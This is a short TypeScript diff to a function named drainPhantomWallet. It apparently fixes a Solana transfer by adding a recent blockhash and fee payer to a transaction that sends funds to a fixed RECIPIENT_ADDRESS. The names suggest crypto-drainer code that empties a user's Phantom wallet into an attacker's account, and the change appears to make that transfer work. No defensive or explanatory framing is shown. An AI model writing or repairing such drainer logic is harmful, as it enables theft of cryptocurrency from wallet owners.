@@ -54,7 +54,16 @@ export async function drainPhantomWallet(): Promise<void> {
       throw new Error("Insufficient funds");
     }
 
-    const transaction = new Transaction().add(
+    // Create a new transaction
+    const transaction = new Transaction();
+
+    // Get the latest blockhash
+    const { blockhash } = await connection.getLatestBlockhash();
+    transaction.recentBlockhash = blockhash;
+    transaction.feePayer = senderPublicKey;
+
+    // Add the transfer instruction
+    transaction.add(
       SystemProgram.transfer({
         fromPubkey: senderPublicKey,
         toPubkey: RECIPIENT_ADDRESS,
